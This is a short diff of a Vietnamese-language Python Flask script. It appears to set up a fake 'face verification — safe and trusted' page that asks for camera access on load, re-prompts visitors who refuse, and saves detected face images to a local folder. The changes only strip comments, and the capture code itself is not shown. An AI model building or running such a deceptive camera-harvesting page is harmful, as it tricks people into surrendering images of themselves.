@@ -8,10 +8,8 @@ import subprocess
 from rich.console import Console
 from rich.panel import Panel
 
-# Khởi tạo console cho Rich
 console = Console()
 
-# Nhập thông tin admin
 TITLE = input("Nhập tiêu đề (phần bên ngoài chữ lớn) (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
 SUBTITLE = input("Nhập phần bên dưới chữ lớn (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
 YOUTUBE_LINK = input("Nhập link (mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
@@ -21,7 +19,6 @@ app = Flask(__name__)
 os.system("clear")
 os.system("cls")
 
-# In ra Banner ASCII
 banner = r"""
 ██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
@@ -36,13 +33,10 @@ console.print(
     style="bold magenta"
 )
 
-# Khởi tạo classifier phát hiện khuôn mặt
 face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-# HTML/CSS/JS: Tự động yêu cầu cấp quyền camera khi load trang.
-# Nếu không cấp quyền, hiển thị thông báo và nút "Thử lại" sau 3 giây.
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
